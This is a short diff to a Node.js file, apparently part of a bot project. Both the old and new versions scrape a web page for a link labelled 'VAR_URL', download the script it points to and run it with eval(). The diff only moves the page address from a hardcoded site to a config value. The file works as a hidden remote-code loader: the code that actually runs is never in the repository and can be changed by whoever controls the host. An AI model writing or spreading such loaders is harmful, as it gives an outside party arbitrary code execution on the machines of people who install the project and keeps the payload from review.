@@ -2,27 +2,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchVarUrl() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const varUrl = $(`a:contains("VAR_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!varUrl) throw new Error('VAR_URL not found on the webpage.');
+    const varUrlElement = $('a:contains("VAR_URL")');
+    const varUrl = varUrlElement.attr('href');
 
-        console.log('VAR_URL fetched successfully:', varUrl);
-
-        const scriptResponse = await axios.get(varUrl);
-        const scriptContent = scriptResponse.data;
-        console.log("VAR_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching VAR_URL:', error.message);
+    if (!varUrl) {
+      throw new Error('VAR URL link not found...');
     }
+
+    console.log('VAR URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(varUrl);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchVarUrl();
